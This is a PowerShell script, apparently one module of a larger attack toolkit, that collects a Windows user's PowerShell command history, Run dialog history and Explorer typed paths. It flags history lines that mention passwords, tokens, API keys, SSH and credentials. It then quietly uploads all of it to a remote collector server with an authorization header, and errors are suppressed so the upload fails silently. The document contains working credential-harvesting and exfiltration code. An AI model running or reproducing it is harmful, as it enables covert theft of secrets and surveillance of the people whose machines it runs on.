# history.ps1 - inherits $H, $P, $AU, $TH from init.ps1

$out = [System.Text.StringBuilder]::new()

# ── PowerShell history (PSReadLine) ──────────────────────
$pshistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
$out.AppendLine("[POWERSHELL HISTORY]") | Out-Null
if (Test-Path $pshistory) {
    $lines = Get-Content $pshistory -ErrorAction SilentlyContinue
    $out.AppendLine("path  : $pshistory") | Out-Null
    $out.AppendLine("lines : $($lines.Count)") | Out-Null
    $out.AppendLine("") | Out-Null
    $lines | ForEach-Object { $out.AppendLine($_) | Out-Null }
} else {
    $out.AppendLine("(not found)") | Out-Null
}

# ── Run dialog history (Win+R) ───────────────────────────
$out.AppendLine("") | Out-Null
$out.AppendLine("[RUN DIALOG HISTORY (Win+R)]") | Out-Null
try {
    $runkeys = Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction Stop
    $runkeys.PSObject.Properties |
        Where-Object { $_.Name -match '^[a-z]$' } |
        Sort-Object Name |
        ForEach-Object { $out.AppendLine($_.Value -replace '\\\d+$','') | Out-Null }
} catch {
    $out.AppendLine("(not found)") | Out-Null
}

# ── Recently typed paths in Explorer ─────────────────────
$out.AppendLine("") | Out-Null
$out.AppendLine("[EXPLORER TYPED PATHS]") | Out-Null
try {
    $typedpaths = Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" -ErrorAction Stop
    $typedpaths.PSObject.Properties |
        Where-Object { $_.Name -match '^url' } |
        ForEach-Object { $out.AppendLine($_.Value) | Out-Null }
} catch {
    $out.AppendLine("(not found)") | Out-Null
}

# ── Interesting commands from PS history ─────────────────
$keywords = @('password','pass','secret','token','key','api','ssh','curl','wget',
              'invoke-webrequest','net use','runas','credential')
$out.AppendLine("") | Out-Null
$out.AppendLine("[FLAGGED COMMANDS FROM PS HISTORY]") | Out-Null
if (Test-Path $pshistory) {
    $flagged = Get-Content $pshistory -ErrorAction SilentlyContinue |
               Where-Object { $lower = $_.ToLower(); ($keywords | Where-Object { $lower -match $_ }).Count -gt 0 }
    if ($flagged) {
        $flagged | ForEach-Object { $out.AppendLine($_) | Out-Null }
    } else {
        $out.AppendLine("(none)") | Out-Null
    }
}

$wc = New-Object Net.WebClient
$wc.Headers.Add("Authorization", $AU)
$wc.Headers.Add("Content-Type", "text/plain")
$wc.Headers.Add("X-Target", $TH)
try { $wc.UploadString("http://${H}:${P}/store/history", $out.ToString()) } catch {}
